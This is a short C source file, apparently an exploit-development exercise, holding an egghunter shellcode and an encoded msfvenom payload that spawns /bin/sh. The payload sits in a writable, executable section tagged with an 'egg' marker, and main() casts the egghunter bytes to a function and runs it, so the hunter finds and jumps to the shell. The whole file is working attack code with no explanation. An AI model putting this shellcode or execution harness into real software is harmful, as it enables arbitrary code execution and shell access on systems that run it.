#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

__attribute__((section(".shellcode_payload,\"awx\",@progbits#")))


// msfvenom -p linux/x64/exec CMD=/bin/sh -f c 
 unsigned char shellcode[] = "\x65\x67\x67\x73\x65\x67\x67\x73"
"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\x04\x25\x6f\xfb\x68\x0c\xcd\x57\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x4c\x9d\x40\x99\x01\x62"
"\xe2\x24\x6c\x25\xf6\xab\x3c\x53\x9f\x31\x6c\x08\x0c\xaf\x36"
"\x5e\x25\x5f\x04\x25\x6f\xd4\x0a\x65\xa3\x78\x77\x4d\x6f\xad"
"\x3f\x58\x93\x3d\x3f\x7d\x60\xfe\x68\x0c\xcd\x57";
  

int main()
{
    const char egghunter[] = \
"\x48\x31\xff\x57\xeb\x09\x5f\x66\x81\xcf\xff\x0f\x48\xff\xc7\x48\x31\xc9\x48\x31\xc0\x04\x57\x0f\x05\x3c\xf2\x57\x66\xb9\xfe\x0f\x74\xe4\x48\x31\xc0\x48\xb8\x64\x67\x67\x73\x65\x67\x67\x73\x48\xff\xc0\x57\x48\xaf\x5f\x74\x07\x48\xff\xc7\xe2\xe5\xeb\xd0\x48\x83\xc7\x08\xff\xe7";
    int (*ret)() = (int(*)())egghunter;  
    ret();
}
